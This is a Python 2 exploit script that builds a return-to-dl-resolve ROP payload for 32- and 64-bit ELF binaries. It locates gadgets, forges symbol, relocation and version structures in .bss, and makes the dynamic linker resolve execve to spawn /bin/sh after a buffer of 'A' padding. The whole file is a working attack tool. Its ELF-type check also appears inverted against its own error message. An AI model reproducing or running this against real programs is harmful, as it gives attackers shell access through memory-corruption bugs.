import sys
import json
import subprocess

import elftools.elf.structs
from elftools.elf.elffile import ELFFile
from elftools.elf.constants import P_FLAGS, SH_FLAGS
from elftools.elf.enums import ENUM_E_TYPE

ElfN_Versym_size = 2

relocation_types = {
    "EM_386": 7,
    "EM_X86_64": 7
}

class Exploit:
    __slots__ = "arch", "little", "pointer_size", "bss", "dynstr", "dynsym", \
                "relplt", "plt", "filler", "relocation_type", \
                "gnuversion", "dynamic", "versym", "gadgets", "fini"

    def __init__(self):
        self.gadgets = {}

    def allocate_helpers(self, buffer):
        pass

    def add_gadget(self, architecture, name, info, gadget):
        if architecture not in self.gadgets:
            self.gadgets[architecture] = {}
        self.gadgets[architecture][name] = (info, gadget)

    def get_gadget(self, name):
        return self.gadgets[self.arch][name]

    def config_from_elf(self, path):
        with open(path, "r") as executable_file:
            elf = ELFFile(executable_file)
            get_section = lambda name: first_or_none(filter(lambda section: section.name == name, elf.iter_sections()))

            # Checks
            if elf.header.e_type == ENUM_E_TYPE["ET_EXEC"]:
                raise Exception("Only non-PIE executables are supported")

            # Binary type
            self.arch = elf.header.e_machine
            self.little = elf.little_endian
            self.pointer_size = elf.elfclass / 8
            self.pointer_format = ("0x%." + str(self.pointer_size * 2) + "x")
            self.structs = elftools.elf.structs.ELFStructs(self.little, self.pointer_size * 8)

            # Useful sections
            self.bss = get_section(".bss").header.sh_addr
            self.dynstr = get_section(".dynstr").header.sh_addr
            self.dynsym = get_section(".dynsym").header.sh_addr

            relplt_section = get_section(".rel.plt")
            self.addend = relplt_section is None
            if self.addend:
                relplt_section = get_section(".rela.plt")
            self.relplt = relplt_section.header.sh_addr

            self.plt = get_section(".plt").header.sh_addr
            self.gnuversion = get_section(".gnu.version").header.sh_addr

            # Dynamic section
            dynamic_section = get_section(".dynamic")
            self.writable_dynamic = dynamic_section.header.sh_flags & SH_FLAGS.SHF_WRITE
            self.dynamic = dynamic_section.header.sh_addr
            dynamic_entries = [self.structs.Elf_Dyn.parse(dynamic_entry)
                               for dynamic_entry in
                               chunks(dynamic_section.data(), self.structs.Elf_Dyn.sizeof())]
            fini = filter(lambda (i, entry): entry.d_tag == "DT_FINI", enumerate(dynamic_entries))
            if len(fini) > 0:
                self.fini = self.dynamic + self.structs.Elf_Dyn.sizeof() * fini[0][0]
            versyms = filter(lambda (i, entry): entry.d_tag == "DT_VERSYM", enumerate(dynamic_entries))
            if len(versyms) > 0:
                self.versym = self.dynamic + self.structs.Elf_Dyn.sizeof() * versyms[0][0]

            # Gadgets
            executable_sections = filter(lambda segment: segment.header.p_flags  & P_FLAGS.PF_X, elf.iter_segments())

            for name, (info, gadget) in self.gadgets[self.arch].iteritems():
                location = find_string(executable_sections, hex_bytes(gadget))
                if location is None:
                    raise Exception("Can't find gadget " + name)
                self.gadgets[self.arch][name] = (info, gadget, location)

            self.filler = self.ptr2str(reduce(lambda x,y: (x << 32) | 0xdeadb00b, xrange(1 + (self.pointer_size % 4)), 0))
            self.relocation_type = relocation_types[self.arch]

        log(self.dump())

    def dump(self):
        return "\n".join([slot + ": " + str(getattr(self, slot)) for slot in self.__slots__])

    # Utility functions
    # =================

    def ptr2str(self, integer):
        string = integer_to_bigendian(integer)
        if self.little:
            return string.rjust(self.pointer_size, "\x00")[::-1]
        else:
            return string.ljust(self.pointer_size, "\x00")

    def str2ptr(self, string):
        ptr = bigendian_to_integer(string)
        if self.little:
            return int("".join(reversed(list(chunks(ptr, 2)))), 16)
        else:
            return int(ptr, 16)

    # Architecture-specific
    # =====================

    def write_string(self, memory_area, string):
        string_len = len(string)
        if string_len > memory_area.size:
            raise Exception("You're trying to write {} bytes in a MemoryArea {} bytes wide".format(string_len, memory_area.size))

        result = ""
        remaining = string
        while len(remaining) > 0:
            remaining, writer = self.do_writemem(self.ptr2str(memory_area.start + len(string) - len(remaining)), remaining)
            result += writer

        memory_area.content += string

        return result

    def write_pointer(self, memory_area, pointer):
        return self.write_string(memory_area, self.ptr2str(pointer))

    # Craft data structures for _dl_fixup
    # ===================================

    def jump_to(self, buffer, function_name):

        if not function_name.endswith("\0"):
            function_name += "\0"

        rel_struct = self.structs.Elf_Rela if self.addend else self.structs.Elf_Rel

        relocation_target = buffer.allocate(self.pointer_size, name="relocation_target")
        function_name_str = buffer.allocate(len(function_name), self.dynstr, 1, name="function_name_str")
        symbol = buffer.allocate(self.structs.Elf_Sym.sizeof(), self.dynsym, name="symbol")

        # Looks like 64-bit and 32-bit have different alignment for the call to _dl_fixup
        reloc_alignment = 1 if self.pointer_size * 8 == 32 else rel_struct.sizeof()
        reloc = buffer.allocate(rel_struct.sizeof(), self.relplt, reloc_alignment, name="reloc")

        exploit = ""

        # No versioning
        if self.versym:
            log("Versyms")
            dynamic_versym_dynentry = self.structs.Elf_Dyn.parse("\0" * self.structs.Elf_Dyn.sizeof())
            dynamic_versym_dynentry.d_tag = "DT_VERSYM"
            dynamic_versym_dynentry.d_val = self.gnuversion - ElfN_Versym_size * symbol.index # + 2 * 2
            dynamic_versym = MemoryArea(self, self.versym, self.structs.Elf_Dyn.sizeof())
            exploit += self.write_string(dynamic_versym, self.structs.Elf_Dyn.build(dynamic_versym_dynentry))

        # String
        exploit += self.write_string(function_name_str, function_name)

        # Symbol
        function_symbol = self.structs.Elf_Sym.parse("\0" * self.structs.Elf_Sym.sizeof())
        function_symbol.st_name = function_name_str.index
        function_symbol.st_info.bind = "STB_GLOBAL"
        function_symbol.st_info.type = "STT_FUNC"

        exploit += self.write_string(symbol, self.structs.Elf_Sym.build(function_symbol))

        # Relocation
        function_reloc = rel_struct.parse("\0" * rel_struct.sizeof())
        function_reloc.r_offset = relocation_target.start
        function_reloc.r_info_type = self.relocation_type
        function_reloc.r_info_sym = symbol.index

        if self.pointer_size * 8 == 32:
            function_reloc.r_info = function_reloc.r_info_type | (function_reloc.r_info_sym << 8)
        else:
            function_reloc.r_info = function_reloc.r_info_type | (function_reloc.r_info_sym << 32)

        exploit += self.write_string(reloc, rel_struct.build(function_reloc))

        # Launch
        launch = self.ptr2str(self.plt) + self.ptr2str(reloc.index)

        return exploit, launch


class CommonGadgetsExploit(Exploit):
    def __init__(self):
        Exploit.__init__(self)
        self.add_gadget("EM_386", "writemem", 4,
                        " 8b 54 24 08" + # mov edx,DWORD PTR [esp+0x8] \
                        " 8b 44 24 04" + # mov eax,DWORD PTR [esp+0x4] \
                        " 89 10"       + # mov DWORD PTR [eax],edx \
                        " c3")           # ret

        self.add_gadget("EM_386", "cleanup", 4,
                        " 5b" + # pop ebx \
                        " 5e" + # pop esi \
                        " 5f" + # pop edi \
                        " 5d" + # pop ebp \
                        " c3")  # ret

        # self.add_gadget("EM_X86_64", "writemem", 8,
        #                 " 48 8b 54 24 10" + # mov rdx,QWORD PTR [rsp+0x10] \
        #                 " 48 8b 44 24 08" + # mov rax,QWORD PTR [rsp+0x8] \
        #                 " 48 89 10"       + # mov QWORD PTR [rax],rdx \
        #                 " c3")              # ret

        self.add_gadget("EM_X86_64", "writemem", 8,
                        " 48 89 37"       + # mov    QWORD PTR [rdi],rsi \
                        " c3")              # ret

        self.add_gadget("EM_X86_64", "cleanup", 6,
                        " 5b"    + # pop    rbx \
                        " 5d"    + # pop    rbp \
                        " 41 5c" + # pop    r12 \
                        " 41 5d" + # pop    r13 \
                        " 41 5e" + # pop    r14 \
                        " 41 5f" + # pop    r15 \
                        " c3")     # ret

        self.add_gadget("EM_X86_64", "args", None,
                        " 4c 89 ea" +   # mov    rdx,r13 \
                        " 4c 89 f6" +   # mov    rsi,r14 \
                        " 44 89 ff" +   # mov    edi,r15d \
                        " 41 ff 14 dc") # call   QWORD PTR [r12+rbx*8]

    def allocate_helpers(self, buffer):
        Exploit.allocate_helpers(self, buffer)
        if self.arch == "EM_X86_64":
            self.popret = buffer.allocate(self.pointer_size, name="popret")
            nope, nope, cleanup_location = self.get_gadget("cleanup")
            return self.write_pointer(self.popret, cleanup_location + 8)
        return ""

    def call64(self, invocation, parameters):
        if len(parameters) > 3:
            raise Exception("Too many parameters")
        elif self.str2ptr(parameters[0]) & 0xffffffff00000000 != 0:
            raise Exception("First parameters high part has to be 0")
        elif len(parameters) == 0:
            return invocation
        elif len(parameters) < 3:
            parameters = parameters + [self.ptr2str(0)] * (3 - len(parameters))

        nope, nope, args_location = self.get_gadget("args")
        nope, nope, cleanup_location = self.get_gadget("cleanup")
        result = self.ptr2str(cleanup_location)
        result += self.ptr2str(0) # rbx
        result += self.ptr2str(1) # rbp == rbx + 1
        result += self.ptr2str(self.fini + 8) # r12, jump to pop;ret
        result += parameters[2] # r13 -> rdx
        result += parameters[1] # r14 -> rsi
        result += parameters[0] # r15 -> edi
        result += self.ptr2str(args_location) # move registers; call pop;ret
        result += self.filler * 7
        result += invocation

        return result

    def call32(self, invocation, parameters):
        cleanup_size, nope, cleanup_location = self.get_gadget("cleanup")
        if len(parameters) > cleanup_size:
            raise Exception("Too many parameters, find a better gadget")

        return invocation + \
               self.ptr2str(cleanup_location) + \
               "".join(map(str, parameters)) + \
               self.filler * (cleanup_size - len(parameters))

    def call(self, invocation, parameters):
        if self.arch == "EM_386":
            return self.call32(invocation, parameters)
        elif self.arch == "EM_X86_64":
            return self.call64(invocation, parameters)
        else:
            raise Exception("Unsupported architecture")

    def do_writemem(self, address, value):
        write_size, nope, location = self.get_gadget("writemem")

        remaining = ""
        if len(value) > write_size:
            remaining = value[write_size:]
            value = value[0:write_size]
        elif len(value) < write_size:
            value = value.ljust(write_size, "\0")

        result = self.call(self.ptr2str(location), [address, value])
        return remaining, result

class ExecveExploit(CommonGadgetsExploit):
    # Set up the exploit
    # ==================

    def launch(self, program):

        buffer = Buffer(self, self.bss)

        binsh_str = program + "\0"

        pointer_to_null = buffer.allocate(self.pointer_size, name="pointer_to_null")
        binsh = buffer.allocate(len(binsh_str), name="binsh")

        exploit = ""

        exploit += self.allocate_helpers(buffer)

        # Pointer to NULL
        exploit += self.write_pointer(pointer_to_null, 0)

        # /bin/sh
        exploit += self.write_string(binsh, binsh_str)

        prepare, launch = self.jump_to(buffer, "execve")

        exploit += prepare

        exploit += self.call(launch, [binsh.pointer, pointer_to_null.pointer, pointer_to_null.pointer]) + self.filler

        log(buffer.dump())

        return exploit

def integer_to_bigendian(n):
    s = '%x' % n
    if len(s) & 1:
        s = '0' + s
    return s.decode('hex')

def bigendian_to_integer(string):
    return string.encode("hex")

class Buffer:
    def __init__(self, exploit, start):
        self.start = start
        self.current = start
        self.areas = {}
        self.exploit = exploit
    def allocate(self, size, align_to=None, alignment=None, name=None):
        result = MemoryArea(self.exploit, self.current, size, align_to, alignment)
        self.current += result.size
        if name is not None:
            self.areas[name] = result
        return result

    def dump(self):
        result = ""
        for k, v in self.areas.iteritems():
            result += "Area " + k + "\n" + "\n".join([" " * 4 + line for line in v.dump().split("\n")]) + "\n"
        return result

def log(string):
    sys.stderr.write(string + "\n")

def chunks(l, n):
    for i in xrange(0, len(l), n):
        yield l[i:i+n]


class MemoryArea:
    def __init__(self, exploit, start, size, align_to=None, alignment=None):
        self.exploit = exploit
        if align_to is not None:
            if start < align_to:
                raise Exception("Trying to align to a something which is after our buffer: aligning " + self.exploit.pointer_format % start + " to " + self.exploit.pointer_format % align_to)
            self.align_to = align_to
            self.alignment = size if (alignment is None) else alignment
            self.start = align(start, self.align_to, self.alignment)
            self.index = (self.start - self.align_to) / self.alignment
        else:
            self.alignment = 1
            self.align_to = 0
            self.start = start
            self.index = 0

        self.content = ""
        self.pointer = self.exploit.ptr2str(self.start)
        self.size = size
        self.end = self.start + self.size

    def dump(self):
        result = ""
        result += "Start: " + self.exploit.pointer_format % self.start + "\n"
        result += "Size: " + self.exploit.pointer_format % self.size + " (" + str(self.size) + ")\n"
        result += "End: " + self.exploit.pointer_format % self.end + "\n"
        result += "Base: " + self.exploit.pointer_format % self.align_to + "\n"
        result += "Alignment: " + str(self.alignment) + "\n"
        result += "Index: " + hex(self.index) + " (" + str(self.index) + ")\n"
        result += "Content:\n"
        for chunk in chunks(self.content, self.exploit.pointer_size):
            result += " " * 4 + " ".join(["%.2x" % ord(c) for c in chunk]) + " " + self.exploit.pointer_format % self.exploit.str2ptr(chunk) + "\n"
        return result

def align(address, base, of):
    offset = (address - base) % of
    return address if offset == 0 else address + of - offset

def hex_bytes(string):
    return "".join(map(lambda x: chr(int(x, 16)), filter(len, string.split(" "))))

def find_string(sections, string):
    result = [section.header.p_vaddr + section.data().index(string) for section in sections if string in section.data()]
    return first_or_none(result)

def first_or_none(list):
    return list[0] if len(list) > 0 else None

def main():
    executable_path = sys.argv[1]
    exploit = ExecveExploit()
    exploit.config_from_elf(executable_path)
    sys.stdout.write("A" * int(sys.argv[2]) + exploit.launch("/bin/sh"))

if __name__ == "__main__":
    main()
